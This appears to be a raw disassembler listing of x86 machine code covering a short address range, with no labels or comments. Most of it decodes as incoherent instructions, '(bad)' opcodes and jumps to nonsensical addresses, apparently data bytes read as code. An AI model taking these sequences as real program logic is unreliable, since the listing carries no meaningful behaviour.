  41af43:	jmp    0x29eb:0x2c031eb7
  41af4a:	jb     0x41af05
  41af4c:	(bad)  
  41af4d:	mov    dl,0xf
  41af4f:	in     al,dx
  41af50:	outs   dx,DWORD PTR ds:[esi]
  41af51:	mov    edx,DWORD PTR [esi]
  41af53:	cs jg  0x41afb1
  41af56:	pop    esp
  41af57:	mov    ds:0x7ee75b3e,al
  41af5c:	cli    
  41af5d:	ss iret 
  41af5f:	cs mov al,0x36
  41af62:	jmp    0x41af67
  41af64:	ds push es
  41af66:	(bad)  
  41af67:	jle    0x41af69
	...
  41af91:	add    dl,ch
  41af93:	ss sti 
  41af95:	jl     0x41af19
  41af97:	aas    
  41af98:	not    DWORD PTR [eax-0x74]
  41af9b:	sub    esp,DWORD PTR [edx-0x46]
  41af9e:	push   ss
  41af9f:	mov    ss,edi
  41afa1:	jmp    0x7d5be0c9
  41afa6:	or     ch,dl
  41afa8:	and    esp,DWORD PTR [eax]
  41afaa:	bound  esi,QWORD PTR [ebx-0x53]
  41afad:	cmc    
  41afae:	or     ecx,DWORD PTR [ebx+0x3f5a3862]
  41afb4:	jmp    0xb946:0x34aec7bb
  41afbb:	pop    ss
  41afbc:	retf   
  41afbd:	sbb    ecx,DWORD PTR [esi+edx*8-0x71512363]
  41afc4:	xchg   cl,ch
  41afc6:	(bad)  
  41afc7:	mov    ds:0x431a4072,eax
  41afcc:	add    BYTE PTR [esi],bl
  41afce:	jb     0x41afa4
  41afd0:	into   
  41afd1:	sbb    DWORD PTR [ebp+0x3b66fd8c],0x3b0d23f7
  41afdb:	mov    ds:0x3f49ad89,eax
  41afe0:	cmp    DWORD PTR [edx],ebp
  41afe2:	and    esp,DWORD PTR [edi]
  41afe4:	and    al,0xa1
  41afe6:	daa    
  41afe7:	and    ch,cl
  41afe9:	in     eax,0x12
  41afeb:	daa    
  41afec:	and    al,0x91
  41afee:	or     bl,BYTE PTR [edi]
  41aff0:	and    al,0xf1
  41aff2:	push   edx
  41aff3:	loope  0x41b019
  41aff5:	in     eax,dx
	...
  41b01e:	add    BYTE PTR [eax],al
  41b020:	cmp    eax,0xbaf0735b
  41b025:	leave  
  41b026:	sub    ch,ch
  41b028:	cmp    eax,0x3295005b
  41b02d:	inc    esi
  41b02e:	add    ah,ch
  41b030:	cmp    eax,0xbae47c5b
  41b035:	mov    BYTE PTR [edx],al
  41b037:	jge    0x41b05c
  41b039:	or     bh,BYTE PTR [ebp+eax*8+0x15]
  41b03d:	pop    ebx
  41b03e:	jnp    0x41b029
  41b040:	cmp    eax,0x266a0307
  41b045:	pop    esp
  41b046:	je     0x41b042
  41b048:	stos   BYTE PTR es:[edi],al
  41b049:	pop    ss
  41b04a:	and    al,0x11
  41b04c:	(bad)  
  41b04d:	sbb    cl,BYTE PTR [ecx-0xe670a49]
  41b053:	mov    esi,0x62307426
  41b058:	cmp    DWORD PTR [edi],0x3f416258
  41b05e:	adc    BYTE PTR [edx+0x12],dh
  41b061:	xor    al,0xd5
  41b063:	cmp    ecx,DWORD PTR [edx-0x2f7e312c]
  41b069:	mov    bh,ch
  41b06b:	mov    ss,esi
  41b06d:	push   ds
  41b06e:	and    al,0x0
  41b070:	neg    esi
  41b072:	jmp    0x41b075
  41b074:	retf   0xe77b
  41b077:	adc    bl,BYTE PTR [edx+ebx*1+0x24]
  41b07b:	adc    BYTE PTR [edx+0x47],ah
  41b07e:	sti    
  41b07f:	push   ecx
  41b080:	cmc    
  41b081:	push   es
  41b082:	into   
  41b083:	call   0x41b088
	...
  41b0ac:	add    BYTE PTR [eax],al
  41b0ae:	xor    eax,0x44fffb8e
  41b0b3:	je     0x41b134
  41b0b5:	std    
  41b0b6:	xchg   esp,eax
  41b0b7:	or     BYTE PTR [ecx+eax*4-0x74ffa259],0x19
  41b0bf:	pop    edx
  41b0c0:	add    al,0x0
  41b0c2:	xchg   edi,eax
  41b0c3:	sbb    BYTE PTR [edi+0x50],cl
  41b0c6:	sbb    al,0xc4
  41b0c8:	call   0xfbb507eb
  41b0cd:	mov    esp,DWORD PTR [ebx-0x59aad797]
  41b0d3:	push   es
  41b0d4:	into   
  41b0d5:	mov    ebp,DWORD PTR [edi]
  41b0d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0d8:	lock repnz inc eax
  41b0db:	jae    0x41b114
  41b0dd:	ret    
  41b0de:	shl    BYTE PTR [ebp-0x79],1
  41b0e1:	inc    esp
  41b0e2:	jnp    0x41b149
  41b0e4:	aaa    
  41b0e5:	xchg   BYTE PTR [ebx-0x77],bh
  41b0e8:	std    
  41b0e9:	call   FWORD PTR [edx+0x4fbe8086]
  41b0ef:	pop    ebx
  41b0f0:	add    BYTE PTR [eax],al
  41b0f2:	pop    ss
  41b0f3:	stc    
  41b0f4:	inc    eax
  41b0f5:	cmp    eax,0x5c17
  41b0fa:	sbb    DWORD PTR [edx+0x7f],0xfffffffd
  41b0fe:	and    eax,0x173d02f9
  41b103:	hlt    
  41b104:	(bad)  
  41b105:	call   DWORD PTR [ebx+0x4d]
  41b108:	xchg   DWORD PTR [ebx+ecx*1+0x15],ebx
  41b10c:	test   DWORD PTR [ebx+edi*8+0x58],ebp
  41b110:	sub    ebp,0x0
	...
  41b13a:	add    BYTE PTR [eax],al
  41b13c:	ds data16 and al,0x89
  41b140:	enter  0xfd8e,0xff
  41b144:	fldenv [ebp+0x52]
  41b147:	mov    DWORD PTR [eax],eax
  41b149:	jmp    0x41b16e
  41b14b:	lock leave 
  41b14d:	adc    DWORD PTR [edi+edi*8-0xfe8d3f],ebp
  41b154:	ret    
  41b155:	xchg   ch,bh
  41b157:	push   DWORD PTR [ecx+0x5224406b]
  41b15d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b15e:	loope  0x41b0eb
  41b160:	add    dh,BYTE PTR [edi-0x1a]
  41b163:	jmp    0x2489be5c
  41b168:	test   BYTE PTR [eax+eax*2],0x24
  41b16c:	push   esi
  41b16d:	out    0x51,eax
  41b16f:	mov    DWORD PTR [eax+0x1a],esi
  41b172:	add    ecx,esi
  41b174:	jns    0x41b1b7
  41b176:	add    ebp,DWORD PTR [esi+0x17e4a]
  41b17c:	mov    ebx,0x55fd08ce
  41b181:	xchg   edi,eax
  41b182:	jp     0x41b1e0
  41b184:	and    bh,BYTE PTR [edx-0x50340280]
  41b18a:	jp     0x41b1d8
  41b18c:	and    bl,BYTE PTR [edx+0x7e2a967a]
  41b192:	add    DWORD PTR [eax],eax
  41b194:	(bad)  
  41b195:	sub    eax,0x35c73c20
  41b19a:	and    BYTE PTR [eax],bh
  41b19c:	mov    bh,0x45
  41b19e:	and    BYTE PTR [eax],dl
	...
  41b1c8:	add    BYTE PTR [eax],al
  41b1ca:	jns    0x41b169
  41b1cc:	or     eax,DWORD PTR [ebx+0x45014619]
  41b1d2:	and    eax,0x32867a79
  41b1d7:	jbe    0x41b1da
  41b1d9:	add    BYTE PTR [ebp+0x62],ch
  41b1dc:	jns    0x41b1ac
  41b1de:	out    0x5a,al
  41b1e0:	pop    ebp
  41b1e1:	(bad)  
  41b1e2:	xrelease xchg DWORD PTR [esi-0x18a0ad83],ebx
  41b1e9:	add    edi,DWORD PTR [ebp-0x18802179]
  41b1ef:	pop    edx
  41b1f0:	out    0x3,eax
  41b1f2:	pop    ss
  41b1f3:	pop    es
  41b1f4:	ret    
  41b1f5:	daa    
  41b1f6:	cmp    ebx,esi
  41b1f8:	mov    BYTE PTR [ebx],al
  41b1fa:	ds pop ebx
  41b1fc:	bound  ecx,QWORD PTR [edi+0x62]
  41b1ff:	das    
  41b200:	jb     0x41b1b8
  41b202:	addr16 xchg esp,eax
  41b204:	ins    BYTE PTR es:[edi],dx
  41b205:	push   DWORD PTR [edi]
  41b207:	inc    esp
  41b208:	cs ins DWORD PTR es:[edi],dx
  41b20a:	cmp    al,0xd4
  41b20c:	es push ebx
  41b20e:	(bad)  
  41b20f:	push   ds
  41b210:	or     edx,DWORD PTR [eax]
  41b212:	(bad)  
  41b213:	jae    0x41b227
  41b215:	xlat   BYTE PTR ds:[ebx]
  41b216:	in     eax,dx
  41b217:	sub    ah,BYTE PTR [edi+esi*1+0x5a]
  41b21b:	inc    edi
  41b21c:	cwde   
  41b21d:	jp     0x41b1a7
  41b21f:	rcl    DWORD PTR [ebx-0x6a8ce5e1],1
  41b225:	lock imul eax,DWORD PTR [edi+0x4f1a67d0],0xffffff99
  41b22d:	das    
	...
  41b256:	add    BYTE PTR [eax],al
  41b258:	(bad)  
  41b259:	cs retf 
  41b25b:	xor    ebp,ebx
  41b25d:	sub    al,0x72
  41b25f:	mov    ch,0x56
  41b261:	jg     0x41b25b
  41b263:	in     eax,0x43
  41b265:	sar    edi,cl
  41b267:	jns    0x41b1eb
  41b269:	aas    
  41b26a:	pop    ds
  41b26b:	dec    ebp
  41b26c:	mov    ss,edx
  41b26e:	lods   eax,DWORD PTR ds:[esi]
  41b26f:	fadd   QWORD PTR [esi]
  41b271:	(bad)  
  41b272:	(bad)  
  41b273:	in     eax,0x67
  41b275:	mov    al,ds:0x6f625862
  41b27a:	inc    ebp
  41b27b:	adc    al,0xc7
  41b27d:	pop    ss
  41b27e:	add    esi,DWORD PTR [edi+esi*4]
  41b281:	das    
  41b282:	add    BYTE PTR ds:0x54cde4e,cl
  41b288:	sub    bl,dh
  41b28a:	push   esp
  41b28b:	int    0x19
  41b28d:	aam    0x44
  41b28f:	lds    ecx,FWORD PTR [ebp+0x30]
  41b292:	push   ebx
  41b293:	cmp    DWORD PTR [edi-0x6b],esp
  41b296:	call   0xfdcaa353
  41b29b:	jb     0x41b2b3
  41b29d:	aas    
  41b29e:	cmp    BYTE PTR [esi],dl
  41b2a0:	ins    DWORD PTR es:[edi],dx
  41b2a1:	aam    0xce
  41b2a3:	(bad)  
  41b2a5:	jae    0x41b248
  41b2a7:	js     0x41b24c
  41b2a9:	mov    BYTE PTR [ecx],bh
  41b2ab:	sub    al,0x19
  41b2ad:	inc    ecx
  41b2ae:	mov    DWORD PTR [ebp+0x6f394349],esp
  41b2b4:	pop    esi
  41b2b5:	pop    edi
  41b2b6:	add    cl,ch
  41b2b8:	sub    BYTE PTR [esi-0x7f],bl
  41b2bb:	xchg   DWORD PTR [eax],eax
	...
  41b2e5:	add    BYTE PTR [edx],dh
  41b2e7:	pop    edi
  41b2e8:	add    cl,ch
  41b2ea:	cmp    eax,0x3df4180f
  41b2ef:	pop    edx
  41b2f0:	add    cl,ch
  41b2f2:	loope  0x41b34d
  41b2f4:	and    DWORD PTR [esi],0xdc170f3c
  41b2fa:	cmp    eax,0xd9e90002
  41b2ff:	pop    ecx
  41b300:	or     DWORD PTR [esi],0x9e0b0f3f
  41b306:	in     eax,dx
  41b307:	ror    esi,cl
  41b309:	adc    DWORD PTR [edi+0x76],esp
  41b30c:	std    
  41b30d:	test   BYTE PTR [esi],0x88
  41b310:	jmp    0x243969de
  41b315:	stc    
  41b316:	xor    BYTE PTR [esi-0x2bc21603],al
  41b31c:	rol    DWORD PTR [edx],1
  41b31e:	repz sub BYTE PTR [ebx+0x62],dl
  41b322:	shl    DWORD PTR [edx-0x3b],cl
  41b325:	add    cl,ch
  41b327:	jle    0x41b324
  41b329:	inc    ebp
  41b32a:	xchg   esp,eax
  41b32b:	scas   eax,DWORD PTR es:[edi]
  41b32c:	std    
  41b32d:	je     0x41b329
  41b32f:	add    BYTE PTR [esp+0x17],ch
  41b333:	add    eax,DWORD PTR [esp+0x33]
  41b337:	sbb    al,0x48
  41b339:	mov    DWORD PTR [ebx],ebp
  41b33b:	cmp    ebx,DWORD PTR [eax+0x3b]
  41b33e:	scas   eax,DWORD PTR es:[edi]
  41b33f:	mov    ?,WORD PTR [edi-0x49]
  41b342:	scas   eax,DWORD PTR es:[edi]
  41b343:	jle    0x41b340
  41b345:	test   DWORD PTR [eax+0x9c818e],edi
	...
  41b373:	add    bh,dl
  41b375:	pop    ecx
  41b376:	add    BYTE PTR [ebx-0x79f4a6b8],al
  41b37c:	and    al,0x5a
  41b37e:	add    BYTE PTR [eax],al
  41b380:	sub    al,0x4e
  41b382:	and    al,0x10
  41b384:	lock add bh,BYTE PTR [edi+0x4d2a502b]
  41b38b:	mov    edi,DWORD PTR [ecx]
  41b38d:	mov    ds:0x7ef8ee2b,al
  41b392:	xchg   DWORD PTR [ebx+eax*2+0x37],edx
  41b396:	push   ebx
  41b397:	push   edx
  41b398:	sbb    al,0xd0
  41b39a:	xchg   eax,ebp
  41b39c:	call   FWORD PTR [eax-0x13]
  41b39f:	call   FWORD PTR [eax]
  41b3a1:	xor    eax,ecx
  41b3a3:	jg     0x41b347
  41b3a5:	add    al,BYTE PTR [esp-0x71]
  41b3a9:	xor    al,BYTE PTR [esi+0x596324]
  41b3af:	jne    0x41b3ff
  41b3b1:	fidivr DWORD PTR [esi+0x596328]
  41b3b7:	add    bl,al
  41b3b9:	push   ecx
  41b3ba:	cmp    DWORD PTR [eax],eax
  41b3bc:	and    bl,BYTE PTR [ecx+0x0]
  41b3bf:	jl     0x41b3e3
  41b3c1:	fdivp  st(3),st
  41b3c3:	add    dl,BYTE PTR [ebx+0x3e003933]
  41b3c9:	das    
  41b3ca:	add    al,0x0
  41b3cc:	call   0xfc46:0x3dfd867f
  41b3d3:	push   esp
  41b3d4:	outs   dx,BYTE PTR ds:[esi]
  41b3d5:	or     edx,edx
  41b3d7:	call   0x41b3dc
	...
  41b400:	add    BYTE PTR [eax],al
  41b402:	ja     0x41b3c7
  41b404:	loope  0x41b403
  41b406:	in     eax,0x8c
  41b408:	inc    eax
  41b409:	pop    ecx
  41b40a:	xchg   ecx,eax
  41b40b:	icebp  
  41b40c:	retf   
  41b40d:	std    
  41b40e:	mov    cl,dh
  41b410:	(bad)  
  41b411:	cmp    ah,bh
  41b413:	mov    al,BYTE PTR [ecx]
  41b415:	mov    DWORD PTR [edx-0x62],ebp
  41b418:	icebp  
  41b419:	mov    ch,bh
  41b41b:	test   eax,0x97350ca
  41b420:	shr    al,cl
  41b422:	and    esp,ebx
  41b424:	loope  0x41b423
  41b426:	add    esi,ecx
  41b428:	lock jmp FWORD PTR [edx]
  41b42b:	das    
  41b42c:	in     eax,dx
  41b42d:	adc    BYTE PTR [ebp-0x4cefda32],dh
  41b433:	mov    ecx,0xf8ec4fe2
  41b438:	shr    eax,1
  41b43a:	cmp    DWORD PTR [ecx+eiz*8],ebp
  41b43d:	std    
  41b43e:	mov    ch,0xc6
  41b440:	and    eax,0x173c354
  41b445:	add    BYTE PTR [esi],bh
  41b447:	mov    edx,eax
  41b449:	jno    0x41b46a
  41b44b:	(bad)  
  41b44d:	add    BYTE PTR [esi],bh
  41b44f:	jb     0x41b452
  41b451:	mov    DWORD PTR [eax+0x3e000586],edi
  41b457:	shl    DWORD PTR [ecx],0x89
  41b45a:	sub    BYTE PTR [edx-0x19],0xeb
  41b45e:	dec    ecx
  41b45f:	test   DWORD PTR [esi+ebp*4],eax
  41b462:	sub    dh,BYTE PTR [esi+0x1]
	...
  41b48d:	add    BYTE PTR [eax],al
  41b48f:	add    BYTE PTR ds:0xacdd1d57,bh
  41b495:	pop    ebx
  41b496:	int3   
  41b497:	xchg   bh,dh
  41b499:	sub    eax,0xffffff81
  41b49c:	inc    edx
  41b49d:	pop    edi
  41b49e:	out    0x3,eax
  41b4a0:	lds    ecx,FWORD PTR [edi]
  41b4a2:	loopne 0x41b4fc
  41b4a4:	sub    eax,edx
  41b4a6:	ins    DWORD PTR es:[edi],dx
  41b4a7:	repz cmp eax,0xb88ce75b
  41b4ad:	(bad)  
  41b4ae:	jmp    0x41b4b3
  41b4b0:	sbb    esp,DWORD PTR ds:[eax-0x6f]
  41b4b4:	push   edx
  41b4b5:	pop    edi
  41b4b6:	out    0x3,eax
  41b4b8:	rcr    esp,0xf7
  41b4bb:	pop    es
  41b4bc:	ds pop ebx
  41b4be:	bound  ecx,QWORD PTR [ecx+0x3e75f36]
  41b4c4:	les    ebp,FWORD PTR [edx-0x17]
  41b4c7:	mov    ch,0xc8
  41b4c9:	cwde   
  41b4ca:	outs   dx,DWORD PTR ds:[esi]
  41b4cb:	repz shl ch,0xd3
  41b4cf:	pop    es
  41b4d0:	ds pop ebx
  41b4d2:	hlt    
  41b4d3:	cld    
  41b4d4:	(bad)  
  41b4d5:	fdivr  st(7),st
  41b4d7:	pop    es
  41b4d8:	ds pop ebx
  41b4da:	jo     0x41b465
  41b4dc:	inc    esi
  41b4dd:	pop    edi
  41b4de:	out    0x3,eax
  41b4e0:	(bad)  
  41b4e1:	rcr    DWORD PTR [ebp-0x1],1
  41b4e4:	cmp    eax,0xc08ce75b
  41b4e9:	push   0xffffffe3
  41b4eb:	add    edi,DWORD PTR [esi]
  41b4ed:	shr    BYTE PTR [ebp-0x5],1
  41b4f0:	cmp    eax,0x8de75b
	...
  41b51d:	add    BYTE PTR [esi+0x59],cl
  41b520:	cmp    ecx,esp
  41b522:	jl     0x41b4f6
  41b524:	test   DWORD PTR [eax+eax*8],0x3e03eb66
  41b52b:	push   cs
  41b52c:	lock mov ?,WORD PTR [eax+0x3e03eb6a]
  41b533:	shl    BYTE PTR [ebp-0x5],cl
  41b536:	cmp    eax,0x7de9005b
  41b53b:	fimul  DWORD PTR [esi+0x5b39cd]
  41b541:	jo     0x41b4f7
  41b543:	imul   eax,DWORD PTR [ecx+ebp*8],0x3d
  41b547:	aam    0x86
  41b549:	icebp  
  41b54a:	inc    ecx
  41b54b:	pop    ebx
  41b54c:	add    BYTE PTR [ecx-0x26792ba6],bh
  41b552:	inc    ecx
  41b553:	pop    ebx
  41b554:	add    BYTE PTR [edi+0x67895b3a],ah
  41b55a:	ds push edi
  41b55c:	add    cl,ch
  41b55e:	ret    0x18d9
  41b561:	in     eax,dx
  41b562:	cmp    eax,0xea4eff5b
  41b567:	pop    esi
  41b568:	add    cl,ch
  41b56a:	sub    dl,BYTE PTR [esi+0x17c2c9d2]
  41b570:	and    al,0x25
  41b572:	rcr    DWORD PTR [ebx+0xfb2b874],0x24
  41b579:	or     ebx,ecx
  41b57b:	jmp    0x5b7f9a90
  41b580:	sub    DWORD PTR [ebp+0x0],edi
	...
  41b5aa:	add    BYTE PTR [eax],al
  41b5ac:	popa   
  41b5ad:	sub    ecx,DWORD PTR [edi+0x72]
  41b5b0:	int3   
  41b5b1:	addr16 add al,0xe9
  41b5b4:	cmp    eax,0x4a054c34
  41b5b9:	sub    eax,0xab9e9e4f
  41b5be:	and    DWORD PTR ds:0xbcc0dd8a,0x2a892649
  41b5c8:	xor    esp,DWORD PTR [eax]
  41b5ca:	pop    esi
  41b5cb:	push   0x76
  41b5cd:	inc    ebx
  41b5ce:	ret    0x3a01
  41b5d1:	aam    0x86
  41b5d3:	stc    
  41b5d4:	inc    ecx
  41b5d5:	pop    ebx
  41b5d6:	add    dl,al
  41b5d8:	stc    
  41b5d9:	ss push eax
  41b5db:	add    BYTE PTR [edx-0x2ba1a4c1],ah
  41b5e1:	xchg   edx,eax
  41b5e2:	cmp    dl,al
  41b5e4:	divps  xmm7,XMMWORD PTR [eax+0x502700]
  41b5eb:	ret    
  41b5ec:	lods   al,BYTE PTR ds:[esi]
  41b5ed:	sbb    ah,BYTE PTR [esp+eax*1]
  41b5f0:	lods   al,BYTE PTR ds:[esi]
  41b5f1:	xchg   esi,eax
  41b5f2:	mov    ebp,0x44d124e9
  41b5f7:	or     BYTE PTR [edi-0x68],ah
  41b5fa:	xchg   DWORD PTR [ebx+edi*1+0x6b],eax
  41b5fe:	jge    0x41b5ec
  41b600:	xor    edx,DWORD PTR [ebx+0x0]
  41b603:	add    BYTE PTR [edx-0x62],ch
  41b606:	jno    0x41b60f
  41b608:	call   0x5dd7:0x42c
  41b60e:	mov    edi,0x8b
	...
  41b637:	add    BYTE PTR [eax],al
  41b639:	add    BYTE PTR [ebx+0x3a],dl
  41b63c:	inc    esp
  41b63d:	add    al,0xe7
  41b63f:	pop    ebp
  41b640:	xchg   DWORD PTR [ebx+edi*8-0x28fffbe3],edx
  41b647:	dec    esp
  41b648:	xchg   DWORD PTR [ebx+edi*8-0x58fffbe3],ecx
  41b64f:	inc    edi
  41b650:	xchg   DWORD PTR [ebx+edi*2-0x68fffb9f],edx
  41b657:	dec    esp
  41b658:	push   eax
  41b659:	mov    ebx,DWORD PTR [ebx]
  41b65b:	cmp    al,BYTE PTR [eax+0x4]
  41b65e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b65f:	pop    ebp
  41b660:	push   edx
  41b661:	push   eax
  41b662:	repnz adc DWORD PTR [eax+ebx*1],esp
  41b666:	out    dx,eax
  41b667:	dec    ebp
  41b668:	icebp  
  41b669:	inc    DWORD PTR [eax-0x23]
  41b66c:	les    ebp,FWORD PTR [ebx+ebp*2]
  41b66f:	pop    ebp
  41b670:	add    bl,al
  41b672:	push   ebx
  41b673:	xchg   edx,eax
  41b674:	int3   
  41b675:	int3   
  41b676:	xor    edx,DWORD PTR [edx-0x6dec3334]
  41b67c:	int3   
  41b67d:	int3   
  41b67e:	ds mov edi,0x7fbfe38a
  41b684:	rol    BYTE PTR [eax],cl
  41b686:	ds je  0x41b6bd
  41b689:	push   esi
  41b68a:	jmp    0x6f49ec9b
  41b68f:	ins    DWORD PTR es:[edi],dx
  41b690:	adc    BYTE PTR [esi+0x3f56f2ed],dh
  41b696:	ds or  edx,esp
  41b699:	mov    edi,0xb60e7626
	...
  41b6c6:	add    BYTE PTR [eax],al
  41b6c8:	inc    edx
  41b6c9:	or     BYTE PTR [edi+ebp*8+0xd0593bd],0xd1
  41b6d1:	push   es
  41b6d2:	or     edx,DWORD PTR [eax]
  41b6d4:	mov    BYTE PTR [ebx],dh
  41b6d6:	add    al,0x83
  41b6d8:	push   es
  41b6d9:	jp     0x41b753
  41b6db:	iret   
  41b6dc:	inc    ecx
  41b6dd:	or     bl,al
  41b6df:	mov    BYTE PTR [edx-0x42be33a9],al
  41b6e5:	mov    ebp,0xa3ef7c1c
  41b6ea:	scas   eax,DWORD PTR es:[edi]
  41b6eb:	mov    bp,0x104f
  41b6ef:	call   DWORD PTR [edx-0x74]
  41b6f2:	mov    eax,ss
  41b6f4:	leave  
  41b6f5:	mov    edx,0xa83e4c8f
  41b6fa:	jmp    0x278a:0xef9ec301
  41b701:	jae    0x41b685
  41b703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b704:	jecxz  0x41b688
  41b706:	fdivp  st(5),st
  41b708:	cdq    
  41b709:	jb     0x41b68d
  41b70b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b70c:	ret    
  41b70d:	sbb    dh,0xfd
  41b710:	mov    DWORD PTR [edx+0x14],esi
  41b713:	fnstenv [ecx]
  41b715:	or     BYTE PTR [edx+0x1b2f0b8],al
  41b71b:	mov    ebp,DWORD PTR [edx]
  41b71d:	stos   BYTE PTR es:[edi],al
  41b71e:	cmp    dh,0x4a
  41b721:	pop    ebx
  41b722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b723:	or     DWORD PTR [edi+edx*1+0x17c6cbd4],esi
  41b72a:	hlt    
  41b72b:	jae    0x41b72d
	...
  41b755:	add    BYTE PTR [edi+0x53],ah
  41b758:	popa   
  41b759:	dec    eax
  41b75a:	or     eax,0x25486faf
  41b75f:	jmp    0x41b70b
  41b761:	xor    BYTE PTR [edi],0x5f
  41b764:	jae    0x41b722
  41b766:	neg    DWORD PTR [esi-0x19]
  41b769:	add    edi,DWORD PTR [esi]
  41b76b:	push   eax
  41b76c:	popf   
  41b76d:	and    esi,0xc5042808
  41b773:	inc    esi
  41b774:	out    dx,eax
  41b775:	adc    BYTE PTR [eax],0x43
  41b778:	dec    esp
  41b779:	or     dh,BYTE PTR [esi+edx*1+0x16b6cbfc]
  41b780:	fdiv   QWORD PTR [ebx-0x19]
  41b783:	push   edx
  41b784:	popa   
  41b785:	inc    edi
  41b786:	sub    eax,0x45475faf
  41b78b:	jmp    0x41b7b7
  41b78d:	and    edi,0x42
  41b790:	sbb    edi,DWORD PTR [ebp-0x6a195bd7]
  41b796:	mov    edi,0x3e451592
  41b79b:	fild   DWORD PTR [ebx]
  41b79d:	or     DWORD PTR [esi-0x38f20ca6],ebp
  41b7a3:	push   esi
  41b7a4:	push   esp
  41b7a5:	and    ebp,DWORD PTR [eax]
  41b7a7:	sbb    ah,bh
  41b7a9:	or     al,0xc2
  41b7ab:	int    0xf7
  41b7ad:	fisub  WORD PTR [ebx-0x406a1181]
  41b7b3:	jp     0x41b792
  41b7b5:	inc    esp
  41b7b6:	ds fcmovne st,st(3)
  41b7b9:	or     BYTE PTR [eax],al
	...
  41b7e3:	add    BYTE PTR [esi-0x48f244a6],ch
  41b7e9:	push   esi
  41b7ea:	pop    esp
  41b7eb:	and    esi,eax
  41b7ed:	sbb    DWORD PTR [eax],eax
  41b7ef:	jmp    0xd9fd8f36
  41b7f4:	mov    BYTE PTR [ebp-0x3],bh
  41b7f7:	stos   BYTE PTR es:[edi],al
  41b7f8:	mov    esp,0x7f9d1881
  41b7fd:	sbb    al,0x81
  41b7ff:	adc    ecx,DWORD PTR [ebp+0x4e]
  41b802:	mov    ebx,ss
  41b804:	push   0xb674fd7d
  41b809:	push   0xfffffffd
  41b80b:	(bad)  
  41b80c:	sbb    ebp,DWORD PTR [eax+ebp*8]
  41b80f:	loopne 0x41b84e
  41b811:	pop    ebx
  41b812:	add    BYTE PTR [esi-0x2a78db95],cl
  41b818:	popa   
  41b819:	cdq    
  41b81a:	or     cl,ch
  41b81c:	push   eax
  41b81d:	(bad)  
  41b81e:	jecxz  0x41b888
  41b820:	push   cs
  41b821:	fadd   QWORD PTR [eax]
  41b823:	jmp    0x1e97e465
  41b828:	mov    bh,0x1a
  41b82a:	or     BYTE PTR [ecx+esi*1-0x25],ch
  41b82e:	mov    bh,0xd9
  41b830:	cmp    eax,0xff60005b
  41b835:	fadd   st(0),st
  41b837:	in     eax,dx
  41b838:	mov    dh,0x4c
  41b83a:	jg     0x41b7c3
  41b83c:	inc    edx
  41b83d:	pop    ebx
  41b83e:	cld    
  41b83f:	jmp    0x62482e40
  41b844:	daa    
  41b845:	(bad)  
  41b846:	in     al,0xa9
	...
  41b870:	add    BYTE PTR [eax],al
  41b872:	xor    ebx,DWORD PTR [ebx+0x0]
  41b875:	test   al,0xa3
  41b877:	push   ecx
  41b878:	pop    es
  41b879:	ja     0x41b842
  41b87b:	inc    ebx
  41b87c:	jg     0x41b804
  41b87e:	inc    edx
  41b87f:	pop    ebx
  41b880:	cld    
  41b881:	jmp    0xf04c2902
  41b886:	jnp    0x41b85e
  41b888:	xor    ah,BYTE PTR [eax-0x38]
  41b88b:	fadd   st(2),st
  41b88d:	in     eax,0xb6
  41b88f:	inc    ebx
  41b890:	jg     0x41b892
  41b892:	lock xchg esi,eax
  41b894:	or     eax,DWORD PTR [eax]
  41b896:	addr16 cdq 
  41b898:	jmp    0x41b8a0
  41b89a:	pop    esp
  41b89b:	pusha  
  41b89c:	test   DWORD PTR [esi],edi
  41b89e:	fsubr  QWORD PTR [ebx+0x7d]
  41b8a1:	out    0x57,al
  41b8a3:	stos   BYTE PTR es:[edi],al
  41b8a4:	(bad)  
  41b8a5:	jmp    DWORD PTR [esi]
  41b8a7:	jne    0x41b8b5
  41b8a9:	mov    ecx,DWORD PTR [ebx+ebx*8-0x21]
  41b8ad:	aas    
  41b8ae:	push   ss
  41b8af:	jl     0x41b8c1
  41b8b1:	or     DWORD PTR [ecx],ebx
  41b8b3:	aam    0x18
  41b8b5:	add    DWORD PTR [edi+edx*2-0x10],0xe7992703
  41b8bd:	add    al,0x1e
  41b8bf:	rol    BYTE PTR [ebp+0x7fcbae32],0xc2
  41b8c6:	and    edx,ebx
  41b8c8:	xor    BYTE PTR [ebx+0x33075f01],al
  41b8ce:	sahf   
  41b8cf:	imul   eax,DWORD PTR [ebp-0x7d],0xffffffd7
  41b8d3:	push   ebp
  41b8d4:	or     ecx,0x0
	...
  41b8fe:	add    BYTE PTR [eax],al
  41b900:	xor    dl,ch
  41b902:	mov    DWORD PTR [ebp+0x67],eax
  41b905:	dec    edx
  41b906:	call   0x9b9032
  41b90b:	pop    edi
  41b90c:	jns    0x41b952
  41b90e:	test   esp,ebp
  41b910:	sbb    bl,BYTE PTR [ecx+0x165c0004]
  41b916:	and    al,0x4
  41b918:	ins    DWORD PTR es:[edi],dx
  41b919:	and    dh,BYTE PTR [ecx+eax*2-0x29]
  41b91d:	ror    BYTE PTR [edx],cl
  41b91f:	mov    DWORD PTR [edi+0x2404c2da],ebp
  41b925:	call   0x4174:0xa22d8104
  41b92c:	xchg   edi,eax
  41b92d:	sub    ebp,esi
  41b92f:	ret    0x59a3
  41b932:	xchg   DWORD PTR [esi+edi*1+0x50],eax
  41b936:	or     BYTE PTR [edx+0x42a806],bh
  41b93c:	mov    ch,0x8b
  41b93e:	mov    cl,BYTE PTR [edx]
  41b940:	mov    ebp,0x7c810533
  41b945:	outs   dx,DWORD PTR ds:[esi]
  41b946:	cmp    dl,0x66
  41b949:	mov    DWORD PTR [edx+0x0],0x4bf65ec
  41b950:	ds (bad) 
  41b952:	mov    ah,bl
  41b954:	out    dx,al
  41b955:	ret    
  41b956:	xor    BYTE PTR [ecx+0x5b887c03],cl
  41b95c:	xor    al,BYTE PTR [edi]
  41b95e:	ss clc 
  41b960:	mov    edx,fs
  41b962:	jmp    0x41b984
	...
  41b98b:	add    BYTE PTR [eax],al
  41b98d:	add    BYTE PTR [esi],bh
  41b98f:	jb     0x41b992
  41b991:	push   0x4206a6
  41b996:	mov    bl,0x2f
  41b998:	fcom   QWORD PTR [eax+0x26]
  41b99b:	int3   
  41b99c:	add    al,0x0
